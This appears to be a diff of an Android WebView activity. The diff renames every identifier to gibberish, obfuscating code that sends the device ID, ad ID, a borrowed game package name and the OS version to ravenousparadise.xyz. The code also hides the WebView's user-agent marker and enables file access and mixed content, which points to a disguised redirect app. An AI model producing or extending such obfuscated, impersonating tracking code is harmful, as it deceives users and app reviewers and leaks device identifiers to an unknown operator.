@@ -20,32 +20,32 @@ import java.io.File
 import java.io.IOException
 
 class LetsDoIt : AppCompatActivity() {
-    private val FILECHOOSERRESULTCODE = 1
+    private val ofjpeorjfperjg = 1
 
     // the same for Android 5.0 methods only
-    var mFilePathCallback: ValueCallback<Array<Uri>>? = null
-    var mCameraPhotoPath: String? = null
-    lateinit var vv: WebView
-    lateinit var bind: ActivityLetsDoItBinding
+    var hfgjrtgjhkh: ValueCallback<Array<Uri>>? = null
+    var kgjfhdkxf: String? = null
+    lateinit var jgidhgjdk: WebView
+    lateinit var hrfghrdssxc: ActivityLetsDoItBinding
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        bind = ActivityLetsDoItBinding.inflate(layoutInflater)
-        setContentView(bind.root)
+        hrfghrdssxc = ActivityLetsDoItBinding.inflate(layoutInflater)
+        setContentView(hrfghrdssxc.root)
 
-        vv = bind.viewWeb
+        jgidhgjdk = hrfghrdssxc.vwvw
         Snackbar.make(
-            bind.root, "Loading...",
+            hrfghrdssxc.root, "Loading...",
             Snackbar.LENGTH_LONG
         ).show()
 
 
-        val cookieManager = CookieManager.getInstance()
-        cookieManager.setAcceptCookie(true)
-        cookieManager.setAcceptThirdPartyCookies(vv, true)
+        val cmngcmng = CookieManager.getInstance()
+        cmngcmng.setAcceptCookie(true)
+        cmngcmng.setAcceptThirdPartyCookies(jgidhgjdk, true)
         webSettings()
         val activity: Activity = this
-        vv.webViewClient = object : WebViewClient() {
+        jgidhgjdk.webViewClient = object : WebViewClient() {
 
 
             override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
@@ -97,13 +97,13 @@ class LetsDoIt : AppCompatActivity() {
 
 
         }
-        vv.webChromeClient = object : WebChromeClient() {
+        jgidhgjdk.webChromeClient = object : WebChromeClient() {
             override fun onShowFileChooser(
                 webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                 fileChooserParams: FileChooserParams
             ): Boolean {
-                mFilePathCallback?.onReceiveValue(null)
-                mFilePathCallback = filePathCallback
+                hfgjrtgjhkh?.onReceiveValue(null)
+                hfgjrtgjhkh = filePathCallback
                 var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                 if (takePictureIntent!!.resolveActivity(packageManager) != null) {
 
@@ -111,14 +111,14 @@ class LetsDoIt : AppCompatActivity() {
                     var photoFile: File? = null
                     try {
                         photoFile = createImageFile()
-                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
+                        takePictureIntent.putExtra("PhotoPath", kgjfhdkxf)
                     } catch (ex: IOException) {
                         // Error occurred while creating the File
                     }
 
                     // continue only if the file was successfully created
                     if (photoFile != null) {
-                        mCameraPhotoPath = "file:" + photoFile.absolutePath
+                        kgjfhdkxf = "file:" + photoFile.absolutePath
                         takePictureIntent.putExtra(
                             MediaStore.EXTRA_OUTPUT,
                             Uri.fromFile(photoFile)
@@ -137,7 +137,7 @@ class LetsDoIt : AppCompatActivity() {
                 chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                 chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                 startActivityForResult(
-                    chooserIntent, FILECHOOSERRESULTCODE
+                    chooserIntent, ofjpeorjfperjg
                 )
                 return true
             }
@@ -161,7 +161,7 @@ class LetsDoIt : AppCompatActivity() {
 
         }
 
-        vv.loadUrl(getUrl())
+        jgidhgjdk.loadUrl(urururururururur())
     }
 
 
@@ -219,63 +219,63 @@ class LetsDoIt : AppCompatActivity() {
     }
 
     private fun webSettings() {
-        val webSettings = vv.settings
-        webSettings.javaScriptEnabled = true
+        val wstwstwstwst = jgidhgjdk.settings
+        wstwstwstwst.javaScriptEnabled = true
 
-        webSettings.useWideViewPort = true
+        wstwstwstwst.useWideViewPort = true
 
-        webSettings.loadWithOverviewMode = true
-        webSettings.allowFileAccess = true
-        webSettings.domStorageEnabled = true
-        webSettings.userAgentString = webSettings.userAgentString.replace("; wv", "")
+        wstwstwstwst.loadWithOverviewMode = true
+        wstwstwstwst.allowFileAccess = true
+        wstwstwstwst.domStorageEnabled = true
+        wstwstwstwst.userAgentString = wstwstwstwst.userAgentString.replace("; wv", "")
 
-        webSettings.javaScriptCanOpenWindowsAutomatically = true
-        webSettings.setSupportMultipleWindows(false)
+        wstwstwstwst.javaScriptCanOpenWindowsAutomatically = true
+        wstwstwstwst.setSupportMultipleWindows(false)
 
-        webSettings.displayZoomControls = false
-        webSettings.builtInZoomControls = true
-        webSettings.setSupportZoom(true)
+        wstwstwstwst.displayZoomControls = false
+        wstwstwstwst.builtInZoomControls = true
+        wstwstwstwst.setSupportZoom(true)
 
-        webSettings.pluginState = WebSettings.PluginState.ON
-        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
-        webSettings.setAppCacheEnabled(true)
+        wstwstwstwst.pluginState = WebSettings.PluginState.ON
+        wstwstwstwst.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
+        wstwstwstwst.setAppCacheEnabled(true)
 
-        webSettings.allowContentAccess = true
+        wstwstwstwst.allowContentAccess = true
     }
 
-    private fun getUrl(): String {
+    private fun urururururururur(): String {
 
-        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+        val spspspspspspsppspspsps = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
 
-        val pack = "com.habby.archeroa"
+        val pcpcpcpcpcpcpcpcpcpc = "com.habby.archeroa"
 
-        val myId: String? = Hawk.get(BIGClass.MYID, "null")
-        val instanceId: String? = Hawk.get(BIGClass.INSTID, "null")
-
-
-
-        val two = "deviceID="
-        val three = "ad_id="
-        val four = "sub_id_4="
-        val five = "sub_id_5="
-        val six = "sub_id_6="
+        val midmidmdijmdi: String? = Hawk.get(BIGClass.hfhfudsjfo, "null")
+        val iidiidiidiid: String? = Hawk.get(BIGClass.vtyhyjuikddggccx, "null")
 
 
-        val first = "http://"
-        val second = "ravenousparadise.xyz/go.php?to=2&"
 
-        val namingI = "naming"
+        val twtwtwtwtwtwtw = "deviceID="
+        val thrhtrhtrhtrht = "ad_id="
+        val fofofofofofofofofo = "sub_id_4="
+        val fififififififififif = "sub_id_5="
+        val sisisisifsisis = "sub_id_6="
 
 
-        val androidVersion = Build.VERSION.RELEASE
+        val fifififiififififiififififiififififi = "http://"
+        val seccscdssdd = "ravenousparadise.xyz/go.php?to=2&"
 
-        val resultAB = first + second
+        val lololololololo = "naming"
 
-        val after = "$resultAB$two$myId&$three$instanceId&$four$pack&$five$androidVersion&$six$namingI"
 
-        Log.d("TESTAG", "Test Result $after")
-        pushToOneSignal(myId.toString())
-        return spoon.getString("SAVED_URL", after).toString()
+        val kiokjjlikjhmkij = Build.VERSION.RELEASE
+
+        val ababababababababa = fifififiififififiififififiififififi + seccscdssdd
+
+        val dfpkborwtjhoej = "$ababababababababa$twtwtwtwtwtwtw$midmidmdijmdi&$thrhtrhtrhtrht$iidiidiidiid&$fofofofofofofofofo$pcpcpcpcpcpcpcpcpcpc&$fififififififififif$kiokjjlikjhmkij&$sisisisifsisis$lololololololo"
+
+        Log.d("TESTAG", "Test Result $dfpkborwtjhoej")
+        pushToOneSignal(midmidmdijmdi.toString())
+        return spspspspspspsppspspsps.getString("SAVED_URL", dfpkborwtjhoej).toString()
     }
 
 
@@ -295,7 +295,7 @@ class LetsDoIt : AppCompatActivity() {
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        if (requestCode != FILECHOOSERRESULTCODE || mFilePathCallback == null) {
+        if (requestCode != ofjpeorjfperjg || hfgjrtgjhkh == null) {
             super.onActivityResult(requestCode, resultCode, data)
             return
         }
@@ -305,7 +305,7 @@ class LetsDoIt : AppCompatActivity() {
         if (resultCode == AppCompatActivity.RESULT_OK) {
             if (data == null || data.data == null) {
                 // if there is not data, then we may have taken a photo
-                results = arrayOf(Uri.parse(mCameraPhotoPath))
+                results = arrayOf(Uri.parse(kgjfhdkxf))
             } else {
                 val dataString = data.dataString
                 if (dataString != null) {
@@ -313,24 +313,24 @@ class LetsDoIt : AppCompatActivity() {
                 }
             }
         }
-        mFilePathCallback?.onReceiveValue(results)
-        mFilePathCallback = null
+        hfgjrtgjhkh?.onReceiveValue(results)
+        hfgjrtgjhkh = null
     }
 
 
-    private var doubleBackToExitPressedOnce = false
+    private var exitexitexitexit = false
     override fun onBackPressed() {
 
 
-        if (vv.canGoBack()) {
-            if (doubleBackToExitPressedOnce) {
-                vv.stopLoading()
-                vv.loadUrl(firstUrl)
+        if (jgidhgjdk.canGoBack()) {
+            if (exitexitexitexit) {
+                jgidhgjdk.stopLoading()
+                jgidhgjdk.loadUrl(urlfififif)
             }
-            this.doubleBackToExitPressedOnce = true
-            vv.goBack()
+            this.exitexitexitexit = true
+            jgidhgjdk.goBack()
             Handler(Looper.getMainLooper()).postDelayed(Runnable {
-                doubleBackToExitPressedOnce = false
+                exitexitexitexit = false
             }, 2000)
 
         } else {
@@ -338,23 +338,23 @@ class LetsDoIt : AppCompatActivity() {
         }
     }
 
-    var firstUrl = ""
-    fun saveUrl(url: String?) {
-        if (!url!!.contains("t.me")) {
+    var urlfififif = ""
+    fun saveUrl(lurlurlurlurlur: String?) {
+        if (!lurlurlurlurlur!!.contains("t.me")) {
 
-            if (firstUrl == "") {
-                firstUrl = getSharedPreferences(
+            if (urlfififif == "") {
+                urlfififif = getSharedPreferences(
                     "SP_WEBVIEW_PREFS",
                     AppCompatActivity.MODE_PRIVATE
                 ).getString(
                     "SAVED_URL",
-                    url
+                    lurlurlurlurlur
                 ).toString()
 
-                val sp = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
-                val editor = sp.edit()
-                editor.putString("SAVED_URL", url)
-                editor.apply()
+                val spspspspsppspspsp = getSharedPreferences("SP_WEBVIEW_PREFS", AppCompatActivity.MODE_PRIVATE)
+                val ededededededed = spspspspsppspspsp.edit()
+                ededededededed.putString("SAVED_URL", lurlurlurlurlur)
+                ededededededed.apply()
             }
         }
     }
